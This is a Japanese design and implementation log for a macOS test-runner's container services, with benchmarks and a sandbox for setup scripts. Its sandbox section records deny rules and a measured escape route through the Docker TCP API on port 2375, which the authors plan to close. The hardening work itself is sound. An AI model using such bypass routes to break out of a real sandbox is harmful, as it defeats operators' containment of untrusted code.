  ビルドに使うフォルダが `/private/tmp/…`・`/private/var/folders/…` だと**中身を空で送り**(`transferring context: 2B`)、
  `COPY` が「not found」で落ちる。`/tmp/…`・`/var/folders/…`・ホームの下は通る。相対パス `.` でも、今いるフォルダの
  実体が `/private/…` なら落ちる。**fleetest は検査のためにパスを実体パス(`realpath` = `/private/…`)へ直す**ので、
  その形をそのまま渡すと踏む。**照合は実体パス・渡すのは宣言どおりの形**に分け、宣言の形も `/private/` で始まるなら
  起動の前に理由を言って止める(Docker は `/private/tmp/…` でも通った)。マウントの元は `/private/…` でも中身が見えた(実測)
- **データの投入はまとめて1回で**と案内する。`exec` 1回が Apple Container で約 66 ms・Docker で約 31 ms なので、
  1行ずつ `exec` すると 100 行で数秒になる。1回の `exec` に標準入力で SQL を渡すか、公開ポート越しに入れる
  (中継の `exec` は標準入力を通す = 下の「スクリプト」④)

#### 性能(実測 2026-10-14)

M2 Ultra・container 1.1.0・Rancher Desktop(Docker Engine 29.5.3)。PostgreSQL 16 + WireMock 3.13.1 を外へ出られない
ネットワークで動かした。1プロセス1条件・暖機1回を捨てて5回の中央値(各値の min〜max の幅は小さい。例: Apple の
起動完了 2.60〜2.66 秒)。モニターの観測プロセス(配信なし)は動いたまま・負荷平均は約 4。

| 段 | Apple Container | Docker(中継あり) | Docker(中継なし = 対照) |
|---|---|---|---|
| ネットワークの作成 | 0.07 s | 0.05 s | 0.03 s |
| 起動 → 2つとも使える(PostgreSQL / WireMock) | **2.6 s**(1.4 / 2.6) | **0.86 s**(0.74 / 0.82) | 0.83 s |
| 片付け | 0.39 s | 0.21 s | 0.18 s |
| HTTP 1往復(1接続ずつ。p50 / p95) | 1.5 / 2.0 ms | 2.0 / 3.2 ms | 1.5 / 2.0 ms |
| `exec` 1回 / `exec` 越しの SQL 1回 | 66 / 74 ms | 31 / 42 ms | 31 / 43 ms |
| ビルド(キャッシュなし / あり) | 6〜7 s / 1.3〜1.4 s | 0.41 s / 0.18 s | ― |
| ランタイムの起動(止まった状態から) | 1.7 s | 23 s | ― |
| アイドルの CPU(1コア = 100%) | 0.3% → 1.2% | 3.5〜4.2% | ― |
| メモリ(`footprint` の phys_footprint。下の注) | 1コンテナ: 何もしない 259 MB・PostgreSQL 445 MB・WireMock 427 MB | VM: コンテナなし 3.2 GB → PostgreSQL + WireMock 4.3 GB | ― |

- **run 1回あたりの固定費は Apple 約 3 秒・Docker 約 1 秒**。Apple はコンテナごとに軽量 VM を起こす分だけ遅い
- **中継のコンテナの負担は無視できる**(HTTP +0.5 ms・p95 +1.2 ms・起動 +0.03 s)
- **メモリは `footprint` の phys_footprint で測る**(実測 2026-10-14)。最初に `ps` の RSS を集計した値(Apple 641 MiB →
  1.9 GiB・Docker 約 8.2 / 14.8 GiB)は、VM のプロセスに割り当てられた量を数えていて実際の使用量より大きく出た(Docker は
  VM の割り当て 12 GiB に近い値になった)。Kubernetes は無効(k3s のイメージが残っているだけ)。アイドルの CPU 3〜4% は
  VM の常駐分。**サービス2つの実際の使用量は Apple 約 0.9 GB・Docker 4.3 GB(うち VM の常駐 3.2 GB)**
- **メモリの予算**(同日の実測): Android Emulator は1台 約 5.7 GB(phys_footprint)・iOS Simulator はデバイスを名指しできる
  プロセスだけで1台 0.6〜0.8 GiB(共有のプロセスは別)。機械のメモリは M2 Ultra 192 GiB・M1Ultra 128 GiB・M1Max 64 GiB・
  **M1mini 8 GiB**。8 GiB の機械ではデバイスを足すと Docker の VM(常駐 3.2 GB〜)が載りにくく、Apple Container
  (サービス1つ 0.3〜0.5 GB)が現実的
- **Docker の数字は SSH の転送方式で測った**。gRPC の転送方式(UDP が届く方)で同じ構成を3回測ると、起動 0.39 → 0.84 s・
  使えるまで 0.86 → 1.27 s・HTTP p50 / p95 2.0 / 3.2 → 2.7 / 5.9 ms・片付け 0.21 → 0.42 s。run 1回で1秒未満の差
- Apple はコンテナを足すほどメモリが増える(既定の上限は1コンテナ 1 GiB)
- イメージの取得(WireMock: Apple 31 s・Docker 9.3 s)は**1回だけの観測**で通信の揺らぎを含むので、優劣の根拠にしない
- 測定のスクリプトは残していない(scratchpad)。測り直すときは同じ構成・同じ規律(1プロセス1条件・暖機を捨てる・
  片方ずつ起動)で

**実アプリ(sut-ec-mobile: Kotlin のサーバー + PostgreSQL)と 8並列のテスト実行**(実測 2026-10-14・M2 Ultra)。
比べた形は3つ —— **今の形**(サーバーはホストの JVM・DB は Apple Container)/ **Apple**(両方 Apple Container)/
**Docker**(両方 Docker・中継は `nodelay`)。どれも外へ出られないネットワーク。Docker の VM は 4 CPU・12 GiB、
Apple は1コンテナ 4 CPU(既定)。

サーバー単体(デバイスなし・各5回の中央値。エラーはどの条件も 0):

| 項目 | 今の形 | Apple | Docker |
|---|---|---|---|
| 起動 → `/health` が応答 | 2.3 s | 3.0 s | 1.6 s |
| 8並列のテストに近い負荷(1ユーザー = 1秒に1画面 × 8)の1要求 p50 / p99 | 1.7 / 12 ms | 4.0 / 18 ms | 2.2 / 12 ms |
| 上限(待ちなし・接続を使い回す 8本)の要求数 | 6,126/秒 | 4,528/秒 | 約 4,560/秒 |
| 動作中のメモリ(`ps` の RSS の集計 = 大きく出る。実際の使用量は上の注) | 1.9 GiB | 1.7 GiB | 14.8 GiB |
| サーバーのビルド(初回 / 2回目以降) | 18 s / 1.0 s | 133 s / 25 s | 88 s / 0.5〜1.2 s |

テスト実行(全21シナリオ。**1回の run は1つの OS だけ** = iOS 8台 / Android 6台(M2 Ultra の上限)。暖機の run を捨て、
最後に今の形をもう1回流して時間の偏りの対照にした。値は本番の2〜3回目 = 1回目は全条件で遅い):

| | 今の形 | Apple | Docker |
|---|---|---|---|
| iOS 8台: テストの時間 | 43.1 / 42.0 s(対照 41.2) | 42.1 / 42.5 s | 43.7 / 42.3 / 41.7 s |
| iOS 8台: シナリオの合計 | 270.7 / 268.8 / 269.4 s | 273.3 / 270.4 s | 269.6 / 267.2 / 267.6 s |
| Android 6台: テストの時間 | 51.3 / 51.5 s(対照 48.7) | 49.4 / 49.3 s | 50.8 / 49.9 / 52.4 s |
| 実行中のサーバーの応答 p50 | 7〜8 ms | 12〜14 ms | 11 ms |
| 実行中のホスト全体の CPU 使用率(中央値) | 45〜60% | 45〜60% | 45〜60% |

- **テストの所要時間に差は出ない**(1〜3% = 繰り返しの揺れと時間の偏り(対照で 2〜3 秒)の範囲)。コンテナに入れると
  サーバーの応答は1要求 4〜7 ms 遅くなるが、UI の1ステップ(数百 ms〜秒)に埋もれる。**ランタイムの選択は速さでなく
  運用(メモリ・費用・ビルドの繰り返し)で決めてよい**
- 失敗はどの条件でも同じシナリオ(iOS は意図的に赤の S0020 だけ・Android はそれに加えてチェックアウト/注文履歴が毎回)で、
  サーバーの置き方と無関係(今の形でも出る)
- **iOS と Android を1つの run に混ぜると、Android にシナリオが配られなかった**(iOS が先にキューを空にした)。
  比べる測定は1つの OS ごとに回す

**巨大なテストデータの戻し方**(実測 2026-10-14・M2 Ultra。PostgreSQL 16・`pgbench -s 340` = 5.34 GB。DB は両方 4 CPU・
4 GiB。名前付きボリューム + `PGDATA` はその下。②〜③は3回):

| 方法 | Apple Container | Docker(Rancher Desktop) |
|---|---|---|
| ④ 初回の読み込み(= 毎回消す場合の run ごとの費用) | 20.2 s | 20.3 s |
| **② 原本の DB からの複製 `CREATE DATABASE app TEMPLATE app_template STRATEGY FILE_COPY`** | **3.7〜4.0 s** | **2.8〜2.9 s** |
| ② 同じく `STRATEGY WAL_LOG`(PostgreSQL 15 以降の既定) | 9.3〜10.5 s | 8.7〜9.6 s |
| ① 最大の表(約 5 GB)を DB の中の控えから入れ直す(①の最も速い条件) | 33〜35 s | 31〜37 s |
| ③ データ入りのイメージ(`PGDATA` をボリュームでない場所に焼き込む)のビルド | 118 s | 29 s |
| ③ そのイメージからの起動 → 使える | 0.85〜1.2 s | 0.19〜0.22 s |
| ③ 最初の書き込み / 2回目(全セグメントに触る UPDATE) | 3.8 / 1.6 s | 4.0〜5.8 / 1.3〜1.4 s |

- **② は `FILE_COPY` を明示する**(既定の `WAL_LOG` は 2.5〜3 倍遅い)。run-setup.sh の `exec` で書ける = 今の設計のまま
- **① は巨大な表に向かない**(索引の作り直しと WAL で、初回の読み込みより遅い)。触る範囲が小さい表にだけ使う
- **③ の run ごとの費用は ② と同程度**(起動 + 最初の書き込みの上乗せ 2〜4 s。上乗せはファイルの丸ごとの複製と冷えた
  キャッシュの和で、この測り方では分けていない。触るファイル = 1 GB ごとのセグメントが増えるほど増える)。データの
  更新はイメージの作り直し(Apple は 118 s かつビルドのたびに中身を全部送り直す)
- ④の 20 s は**合成データの最速値**。実際のダンプ(`pg_restore`)は索引の数などでかなり遅くなるのが普通
- PostgreSQL の公式イメージは初回に一時サーバーで初期化してから起動し直す。**準備の確認は TCP(`pg_isready -h
  127.0.0.1`)で取る** —— unix ソケットの確認だと一時サーバーで通ってしまい、直後の操作が起動し直しに当たって落ちた

**ランタイムごとのおすすめ**(上の実測すべてから):

| 用途・観点 | Apple Container | Rancher Desktop |
|---|---|---|
| 巨大なデータ(PostgreSQL) | ② `FILE_COPY`(3.7〜4.0 s) | ② `FILE_COPY`(2.8〜2.9 s) |
| 巨大なデータ(PostgreSQL 以外) | ③ はビルド 118 s かつ毎回全部送り直すので、データの更新が少ないときだけ | **③**(ビルド 29 s・起動 0.2 s) |
| 触る範囲が小さいテスト | ① を併用 | ① を併用 |
| DB のデータの置き場 | 名前付きボリューム + `PGDATA` は下のフォルダ(bind マウントでは起動しない) | 名前付きボリューム(bind マウントでも動くが、両方で通る書き方にそろえる) |
| テストの所要時間(8並列) | 差なし | 差なし |
| サービスの起動と片付け | 約 3 s / run | 約 1 s / run |
| サーバーのイメージを頻繁にビルドし直す | 不向き(25 s。`.dockerignore` が必須) | **向く**(0.5〜1.2 s) |
| run-setup.sh からの `exec` | 約 66 ms / 回(投入はまとめて1回) | 約 31 ms / 回 |
| UDP を使うアプリ | **そのまま使える** | gRPC の転送方式へ切り替えが要る(`rdctl set --experimental.virtual-machine.ssh-port-forwarder=false` の後、アプリを完全に終了して起動し直す) |
| メモリ(実際の使用量) | 少ない(サービス2つで約 0.9 GB。1コンテナ 0.3〜0.5 GB・割り当ての既定は 1 GiB) | VM の常駐 3.2 GB + サービス分(2つで 4.3 GB) |
| ランタイムの起動 | 1.7 s | 23 s |
| 入れる手間 | `brew install container`(macOS 26 以降) | アプリを入れ、初回の起動で管理者のパスワード(ランナー機は画面の前で一度) |
| 安全面の注意 | コンテナから Mac の全アドレスの待ち受け(AirPlay の受信など)に届く | 通常のネットワークからは Mac の `127.0.0.1` に届くことがある(機械と転送方式で変わる)= 外へ出られないネットワークの強制で防ぐ |

| こういうときは | おすすめ |
|---|---|
| 巨大なデータを PostgreSQL で扱う | どちらでもよい(②でほぼ同じ) |
| 巨大なデータを PostgreSQL 以外で扱う | Rancher Desktop |
| サーバーのコードを頻繁に変えてビルドし直す | Rancher Desktop |
| UDP を使うアプリ | Apple Container |
| メモリを抑えたい・別の製品を入れたくない・ランナー機を手軽にそろえたい | Apple Container |

#### スクリプト(Seatbelt の中)

`ScenarioSandbox` の土台を使い、**`Scope` に用途(シナリオ / スクリプト)を必須の入力として足す**。書ける場所・通信・
mach の集合は用途ごとに**同じ定義元**から作る(今の `writablePaths` はホームの `.fleetest`・Logs・Caches 等を常に開けるので、
`extraWritable` の値の工夫では絞れない。Codex レビュー 2026-10-14 #9)。

- **① 書ける場所**: `<workspace>/data/`(親が先に作る・根そのものは書かせない = §11.7 と同じ)+
  マシン側の `hooks.writablePaths` + スクリプト専用の一時領域。**`scripts/` と `.fleetest/hooks/` は書かせない**
  (前者は次の起動の材料、後者は次の run が teardown を実行する控え)。**`hooks.writablePaths` は読み込み時に検める**
  (セルフレビュー 2026-10-14): `scripts/`・`.fleetest/hooks/`・ビルド元・`secrets/` / `private/`・ツール本体と重なる指定は設定の誤りとして止める
  (`redirectedDirectoryKeys` と同じ考え方。書ける場所に「枠の外で実行・解釈されるもの」を置かせない)
- **② 読み取り**: シナリオと同じ拒否(`defaultDenyReadHomeSubpaths` + `denyRead`)
- **③ 通信**: **宣言した公開ポート(`127.0.0.1:<p>`)と親のプロキシ・broker のソケットだけ**(`localhost:*` は開けない ——
  スクリプトはデバイスを駆動しないのでブリッジに繋ぐ理由が無く、Docker API を別のポートで公開している Mac やローカルの
  プロキシ経由の迂回も閉じる。Codex レビュー 2026-10-14 #4)。外部は親のプロキシ経由で `allowedDomains` だけ(シナリオと同じ)。**ランタイムのソケットは開けない**
  (unix ソケットは名指しでしか開かない = sandbox-seatbelt.md §2.7)。**実測 2026-10-14**(シナリオの枠の中で
  証人シナリオ = sandbox-seatbelt.md §9.2): Apple Container の `container ls` は XPC が繋がらず失敗・
  `~/.rd/docker.sock` と `/var/run/docker.sock` への接続は `Operation not permitted`・**`127.0.0.1:2375` には繋がった**
  (今の枠は `localhost:*` を開けている)。枠の外では同じ操作が全部通った。スクリプトの枠は localhost を宣言したポートしか
  開けないので当たらないが、**`localhost:*` を開けているシナリオの枠では TCP の docker(2375 / 2376)を後で拒否する**
  (Docker を TCP で公開している Mac では、そこが抜け道になる。adb・Emulator のポートと同じ既存の規律 = §11.7。セルフレビュー 2026-10-14)
- **④ コンテナの中での実行は親が代行する**: スクリプトの `PATH` の先頭に親が作った中継コマンド
  (`SandboxGateway` の経路)を置き、`ServicePolicy` が認めた形だけを親が実行する —— 宣言したサービスでの
  `exec`(標準入力つき)・状態・ログ・公開ポートの照会。**起動・終了・ビルド・コピーと、宣言を経ない
  ランタイムの操作は断る**(サービスの集合は宣言だけが決める)。`exec` で届くのは検査済みのマウントの範囲だけ。
  **broker は用途ごとに別の口**(スクリプト用の broker は `ServicePolicy` だけを持ち、`SimctlPolicy` / `AdbPolicy` を持たない =
  デバイスの文脈が無いスクリプトから simctl / adb を要求させない。Codex レビュー 2026-10-14 #10)。`exec` のランタイム側のオプションは固定し
  (`--env-file` 等で親に任意のファイルを読ませない)、中継のコンテナへの `exec` は断る。**標準入力は 1 MiB の JSON に
  載せず、検査の後にストリームで流す**(今の broker は要求全体 1 MiB・stdin は base64 = 約 750 KiB のダンプで溢れる。
  上限・背圧・中断を持つ。Codex レビュー 2026-10-14 #22)
- **⑤ 終わったら子孫を残さない(目標)**: **直接の子の終了を `ProcessExitWait` の終了通知で、パイプの EOF とは独立に待つ**
  (今の `RunHookRunner.execute` は EOF を待ってから終了を待つので、`sleep 999 &` の孫がパイプを握ると掃除に進めない。
  Codex レビュー 2026-10-14 #12。**`waitpid` を直接呼ばない** = `Foundation.Process` が子を回収するので二重管理になる。Codex レビュー2 2026-10-14 #9)。
  終了したら期限つきで出力を回収し、プロセスグループへ SIGTERM → SIGKILL。**起動時に子の PID・開始時刻・PGID を控えに書く**
  (Codex レビュー2 2026-10-14 #5): 親が SIGKILL されても子は `data/` を書き続けうるので、次の run と `hooks reap` は**控えの子が生きていれば先に
  止めてから**資源を再利用する。`setsid` で離脱した子孫は killpg では止まらず、系譜も失うので**検出できないことがある**
  (実行バイナリのパスでの走査は補助。残っていると分かったら報告する)
- **⑥ 環境は明示した鍵だけ**(`inheritedEnvironment` の基本の鍵 = PATH・HOME・LANG 等・`FT_HOOK` 等の既存の契約 7 つ・
  プロキシ・broker の制御変数・秘密のファイルから渡す名前)。**`ScenarioSandbox.inheritedEnvironment` の `FT_*` 前方一致だけは使わない**(親の `FT_PRIVATE_TOKEN` のような変数まで渡る。
  Codex レビュー2 2026-10-14 #10)。制御変数(`FT_SANDBOX_BROKER`・`HTTP(S)_PROXY` 等)は秘密のファイルの同名の値で上書きさせない。
  シェルのトークンは届かない。秘密が要るなら `account()` と同じこの Mac 側のファイルに置く
- **⑦ 枠の外す口はシナリオと同じ `sandbox.disabled` だけ**(スクリプト用の別スイッチを作らない)
- **入れ子のサンドボックスは使えない** —— スクリプトから `swift` / `xcodebuild` は動かない(§2.8)。
  `brew install` などの道具の導入も通らない(外へ出られず、書ける場所の外に書く)ので、`psql` などは
  **その Mac に事前に入れておく**前提(導入の手順と `fleetest remote setup` の前提判定で案内する)

#### サーバーのイメージの用意(ユーザー決定 2026-10-14)

SUT のサーバーのソースは別のリポジトリ(sut-ec-mobile なら `../sut-ec-mobile`)にあるのが普通で、`build.context` を
`scripts/` に限ると今の形では動かない。

| 形 | 使い方 | 理由 |
|---|---|---|
| **基本: 完成したイメージを受け取る** | CI でビルドしてレジストリに置き compose.yaml に `image:` で書く / `docker save` のファイルを置いて fleetest が読み込む | アプリと同じ考え方 = clone したコードを fleetest の Mac で実行しない。ランナー機も取得するだけ |
| 開発用: 名指ししたビルド元 | マシン側の `services.buildSources`(読み取り専用)に clone を書き、`build.context` がそこを指す | サーバーを直しながら試すとき CI を待たない。中身が変わらなければビルドを撃たない規則が効く |

- ビルドの中で動くコードは VM の中に閉じ、見えるのはビルド元の中身だけ。**ビルド元に秘密(`.env` など)を置かない**と案内する
- ランナー機ではビルド元はその機械の clone(転送されない)→ ランナー機は基本の形が向く
- 「`scripts/` にソースを置く」は勧めない(ソースが二重になり同期の手間が出る)

#### 実装までに決めること(推奨 2026-10-14。ユーザーが受け入れ)

| 項目 | 推奨 |
|---|---|
| サービスのログ | run-setup.sh か run が失敗したとき、各サービスのログの末尾(大きさに上限)をレポートの出力先へ。`doctor --bundle` にも入れる |
| ディスクの片付け | ボリュームは自動で消さない。既存の保持容量の報告に、fleetest が作ったイメージ・ボリュームの大きさを載せて大きくなったら警告。一掃は `services reset` |
| イメージの取得 | 手元に無いときだけ取る。新しくするオプションを置く。閉じたネットワークでは `docker save` のファイルを読み込む手順を案内(中継と UDP 確認用のイメージの初回ビルドも外へ出る必要がある = 同じ手順で読み込める形にする) |
| Apple Container の常駐サービス | カーネルが導入済みなら fleetest が `container system start` を撃つ・未導入なら止めて案内(上の「ランタイムの実体」)。`fleetest doctor` と `remote setup` の前提判定でも同じ判定 |
| 移行 | sut-ec-mobile のワークスペースを、DB とサーバーのイメージを書いた compose.yaml + データ投入だけの run-setup.sh へ。利用者向け docs(en/ja)と導入スキル |
| 実装の段取り | ① 検査と実行計画(純粋な部品とテスト)→ ② ランタイムごとの実行・起動完了の待ち・片付け → ③ スクリプトの枠と中継 → ④ UDP の経路の確認とプロキシ → ⑤ MCP・拡張・docs。各段で単体テストと実データでの確認 |

#### 実装の状況

- **①(解釈・検査・計画)と②(ランタイムごとの実行・起動完了の待ち・片付け)は実装済み**。`FTServices`(①の純粋な部品 +
  `RuntimeCommands` / `ReadinessSchedule` / `ServicesLease` / `RelayImage`)と `Sources/fleetest/Services*.swift`(ランタイムの解決・
  事実の収集・`ServicesSession`・`ServicesReaper`・`ServicesLock`・`fleetest services status|reset`)。配線は `ProfileRunner.run` と
  `ApiRunCommand` の2箇所(dry-run は除く)。`hooks reap` がサービスの孤児も回収する
- **③(スクリプトの枠と中継)も実装済み**: `ScenarioSandbox.Scope` に用途(`.scenario` / `.script`)を足し、スクリプトは
  `ScriptSandbox.launch`(FTCore)で包む。書けるのは `<workspace>/data/`(根は親が作る)+ マシン側 `hooks.writablePaths`
  (`HooksSettings`。scripts/・`.fleetest`・ツール本体・ビルド元・秘密の置き場と重なる指定は読み込み時に断る)+ 子専用の一時領域だけ。
  通信は宣言した公開ポート(127.0.0.1)と親のプロキシ・gateway の unix ソケットだけ(`localhost:*` も bind も開けない)。
  mach / iokit は GPU・ANE・LaunchServices を開けない。**中継コマンドは `fleetest-services`**(PATH の先頭に親が置く。
  `exec <service> -- <cmd…>`(標準入力をストリーム)/ `logs <service> [--tail N]` / `status` / `port <service> <port>[/udp]` の4形だけ =
  FTServices の `ServicePolicy`。親の `ServiceGatewayServer`(FTCore)が行区切り JSON のフレームで stdin / stdout / stderr を流す)。
  環境は基本の鍵 → compose.yaml が参照している秘密 → 契約(`FT_*` 7つ)→ 制御変数(PATH・TMPDIR・プロキシ・gateway)の順で
  **明示した鍵だけ**(`FT_*` の前方一致は使わない)。終了は終了通知で待ち(パイプの EOF と独立)、残ったプロセスグループへ
  SIGTERM → 2 s → SIGKILL。控え(`.fleetest/hooks/<pid>.json`)に動いている子の pid と開始時刻・秘密の名前を書き、`hooks reap` と
  次の run は**先に子を止めてから** teardown を撃つ。`hooks reap` はスクリプトの孤児 → サービスの孤児の順。
  **`exec` にランタイムのオプションは紛れ込まない**(実測: Docker 29.5 も Apple Container 1.1.0 もコンテナ名の後ろを全部コマンドとして
  扱い、`-e` / `--env-file` / `--` は実行対象として失敗する。だから親は `exec -i <container>` の後ろに利用者のコマンドをそのまま置き、
  `--` は渡さない)。証人の run-setup.sh(秘密・gateway・書き込み・読み取り・通信・残置・teardown)は全項目を実データで確認した
- **④(UDP の経路の確認とプロキシ)も実装済み**: `/udp` の公開があるときだけ、サービスの起動完了の後・run-setup.sh の前に、
  中継と同じイメージのエコー(`fleetest-<接頭辞>-udpcheck`)を内部ネットワークに立て(Apple は 127.0.0.1 の空きポートへ自分で公開・
  Docker は中継に最初から含めた確認用のポート経由)、親が毎回変わるトークンを 127.0.0.1 の UDP へ送って同じ値が返るかを見る
  (1 s × 3 回 = `UDPReachability`。I/O は `ServicesUDPProbe`)。**最初は警告だけ**(`→ services: UDP path … answered on probe N` /
  `⚠️ services: 127.0.0.1:<p>/udp (published by <runtime>) did not answer 3 probes of 1s each; TCP on the same path did answer — <原因>`。
  TCP の句はエコーの TCP 側へ実際に送って確かめたときだけ・原因は Rancher Desktop の settings.json が SSH の転送方式と読めたときだけ =
  `RancherPortForwarding`)。終わったらエコーを消す。結果の記録(run.json)への注記は、警告から赤へ上げるときに拡張と一緒に足す(⑤)。
  **プロキシ**: マシン側 `sandbox.allowedDomains` があるときだけ。親の loopback のプロキシのポートを計画に写し、Docker は中継が
  `host.docker.internal:<port>` へ転送、Apple は内部ネットワークの**ゲートウェイの IP に同じ番号**で道を作る(計画の `<gateway>` と
  NO_PROXY の内部サブネットはネットワークを作ってから埋める = `ServicesSession.resolveProxyEntry`)。**Apple の実測で分かったこと**
  (④): ①`--internal` のネットワークのゲートウェイの IP は、**最初のコンテナが付いてから Mac のブリッジ(`bridge1xx`)に現れ、
  全部外れると消える**(付く前の bind は `Can't assign requested address`)→ 最初のコンテナを起こす直前から背景で bind を試み続ける
  (0.2 s 間隔・上限 30 s。実測は 0.4 s 後に bind)②**Network.framework の `NWListener` はそのブリッジのアドレスに bind できない**
  (アドレスが現れた後も同じエラー)が、BSD ソケットの bind は通りコンテナから届く → run 専用の `SandboxProxy`(127.0.0.1・
  内部サブネットを拒否する方針)を立て、ゲートウェイの IP:番号 から BSD ソケットの転送器(`ServicesGatewayForwarder`)で流す
  ③hostOnly でもホストの待ち受けにはコンテナから届く(メンバーの増減でも切れない)④**busybox の wget は `NO_PROXY` を読まない**ので、
  `HTTP_PROXY` を持つコンテナの healthcheck(`wget http://127.0.0.1/`)がプロキシへ向かって 403 で落ちた → healthcheck の `exec` は
  プロキシの変数を `-e KEY=` で空にして撃つ(`RuntimeArgv.exec(clearing:)`)。**両方向の実データ**(④): Apple は UDP の経路が
  2 回目の probe で応答(1 回目は VM 起動直後の取りこぼし = 再送の根拠)・コンテナと枠の中のスクリプトの両方から `example.com` を
  プロキシ経由で取得でき、許可外は 403 / Docker(Rancher 1.24・SSH の転送方式)は「3 回届かず・同じ経路の TCP は届いた・原因 =
  SSH の転送方式(切り替え方つき)」の警告が出て、プロキシは中継(`host.docker.internal` → 127.0.0.1)経由で通り、NO_PROXY に
  Docker の内部サブネット(172.20.0.0/16)が入る。**プロキシは解決した IP を検めてから数値アドレスへ繋ぐ**(`ProxyDestinationPolicy`: loopback・
  未指定・リンクローカル・マルチキャスト・自機のアドレス・内部ネットワークのサブネットを断る。許されたアドレスは解決順に試す =
  先頭の IPv6 に届かない機械で次の IPv4 へ倒れる。接続拒否は NWConnection では `.waiting` で来るので失敗として次へ)。
  これで docs/open-issues.md の「名前のまま接続する」穴は閉じた(シナリオ・スクリプトの loopback のプロキシにも同じ規則)
- **⑤(人の入口・MCP・雛形・docs・小物)も実装済み**: `fleetest services up` は常駐の所有者 `fleetest api services-owner` を起こし
  (fm-serve と同型: stdin は /dev/null・`FT_PARENT_PID` を消す・出力は試みごとの `.fleetest/services/<接頭辞>.attempt-<UUID>.log`。
  控えを書けた所有者だけが排他の中で `<接頭辞>.log` へ改名する = 同時の `up` で負けた所有者が勝った側のログを空にしない。
  負けた試みのログは `up` が消し、失敗した試みのログは残す)、所有者が
  `ServicesSession.up(kind: .owner)` → 控え(`kind = owner`・schema 2・`stopGraceSeconds`)を持ったまま SIGTERM を待ち → `down`。
  CLI の `up` は**所有者が書く控えの `running`** か所有者の終了で決着し(待ちに期限は置かない)、公開ポートと reverse を印字する。
  `services down` は排他の中で「run の控えが生きていれば断る・所有者なら SIGTERM・孤児なら回収」を決めてから**排他の外で**所有者の
  終了を待つ(上限は `ServicesTeardown.teardownBudgetSeconds`)。run の引き取りは `takeOverOwners`(上の「調停」の実装の注記)。
  `up --physical` で LAN 公開・`--serial` で Android 実機への `adb reverse`(run はプロファイルの Android 実機に自動 =
  `ServicesUpOptions.forRun`。TCP の公開ポートごと・控えの `adbReverse` で解除・資源ではないので解除の失敗で控えを残さない)。
  MCP は `ft_services`(`action` / `profile` / `project` / `physical` / `androidSerials`。`swift run fleetest services …` を同期に起こす。
  承認は `ft_start_run` と同列の ask = `ProjectScaffold.mcpAskPermissions`。宛先の予約名 `serial` を引数名に使わない)。
  拡張の雛形は compose.yaml を足し setup / teardown のコメントを枠の規則に書き換えた。失敗の証跡: run-setup.sh の失敗と赤の run の後に
  各サービスのログの末尾(`ServicePolicy.maxLogLines` 行)を `results/runs/<月>/<runID>/services/<service>.log` へ(`saveLogs`)。
  run.json に `servicesWarnings`(adb reverse の警告。UDP は後述のとおり赤。`RunSummary.servicesWarnings` → `RunRecorder.finish` の必須引数)。
  `doctor` は Docker の管理口(2375 / 2376)の非ループバック LISTEN を警告し、サービスの起動は断る(`DockerTCPExposure`。lsof の
  exit 1 + 空出力だけを「無い」と読む)。`preflight.sh` は docker / container の有無を情報として出す(無くても ready)。
  `services pull [--refresh]`(先行取得。中継のイメージの初回ビルドも)と `services load <tar>`(閉じたネットワーク)。
  利用者向け docs は reference/writing/services(新設・en/ja)と extending / mcp_server / other_agents / agent_guide / security の
  sandbox・limitations / fleet の adding_physical_devices。**sut-ec-mobile のワークスペースは compose.yaml へ移行**(db = postgres:16・
  server = clone からの `build:`。run-teardown.sh は削除・run-setup.sh は公開ポートへの到達の確認だけ。ビルド元はマシン側 `services.buildSources`)。
  **実データ(2026-10-15・Apple Container)**: `up` 3.2 s(起動 2.1 s)→ `status` → 2 回目の `up` は「already up」→ 1 シナリオの run が
  所有者を引き取り(警告 → 所有者 1.5 s で片付け → run が 3.0 s で起こし直し → 緑 → 1.3 s で片付け)→ 生きている run の控えがある間の
  `down` / `reset` / `up` は断られ、死んだ run の控えは `down` が回収 → `up --serial 14141JEC204922` で Pixel 4a に `tcp:18080` の reverse が
  張られ `down` で消えた(`adb reverse --list` で確認)。**sut-ec-mobile(db = postgres:16 + server = clone からの build)**: 1 回目は
  **Apple Container のビルダー VM の既定(2 CPU / 2048 MB)で Gradle が ResourceExhausted(ビルドデーモン消失)**= 25 分無出力の末に失敗 →
  `container builder stop && container builder start --cpus 6 --memory 8g` で起こし直すと build 123.9 s・start 1.6 s・ready 5.5 s で上がり、
  枠の中の run-setup.sh が `/health`(`{"status":"ok","db":"up"}`)を読めた → 1 シナリオの run が引き取り(build は指紋で skip・7.3 s で起こし直し)→
  緑 → 5.5 s で片付け。ビルダーの資源は fleetest が変えない(利用者向け docs に注記。`services status` / 起動時にビルダーの資源を言う案は
  未実装)。**変異チェック**: 新テスト 25 件中 24 検出・生き残り 1 件(空の入力の guard)はテストを境界へ寄せて再検出。
  **MCP の入口のテストは実在しないプロジェクト名を添える**(入口の検査が抜けると本物の `swift run fleetest services` を起こし、
  `swift test` のビルドロックと待ち合って止まる = 変異チェックで実際に 30 分止まった)。
  **M1Ultra(ランナー機・Rancher Desktop 1.24 / Docker 29.5)の実データ**(アライン後に E2E-iOS の `ios-m1ultra` へ 1 本): ①1 回目は中継イメージの
  base(alpine)の取得が Docker Hub の CDN から `EOF` で切れて run が始まらなかった(一過性。手で `docker pull` すると通る。
  取得の再試行は置いていない = `services pull` で先に取る運用)②2 回目は中継イメージは通ったが `busybox` の pull が
  `docker-credential-osxkeychain: executable file not found in $PATH` で失敗 —— docker CLI は config.json の `credsStore` の
  ヘルパーを **PATH から** 起こし、ヘルパーは docker と同じ `~/.rd/bin` に居るが ssh 越しの非対話 PATH には無い → `RuntimeCLI` が
  docker を起こすときは **docker の置き場を PATH の先頭に足す**(`pathWithExecutableDirectory`。子プロセスの非対話 PATH の補正の規律)
  ③3 回目はサービスが 5.5 s で上がった(pull 4.9 s)が、枠の中の run-setup.sh が `fleetest-services: command not found` ——
  `remote align` がビルドする製品の一覧(`RemoteSetupPlan.alignRevisionCommand` = fleetest + 配信ヘルパー)に中継が無かった
  (受け手の install.sh は `swift build` 全体なので届く)。名前の定義元を `ServiceGatewayWire.relayProductName` の 1 箇所にして一覧へ足し、
  集合を等号で固定するテスト(`StreamHelperNamingTests`)を置いた。**ランナー機の実データはこの 3 つの穴を順に塞いで通した**(次の段落の実測)。
  **`services status` の大きさ**(⑤の締め): fleetest が作ったイメージ(この接頭辞の `build:` と中継)と名前付きボリュームを大きさつきで出す。
  Docker は `image ls` の大きさと `system df -v --format json` の `Volumes[].Size`(`volume inspect` には無い)・Apple は
  `image ls --format json` の `variants[].size` の和と、`volume inspect` の `source`(512 GiB のスパースな volume.img)の
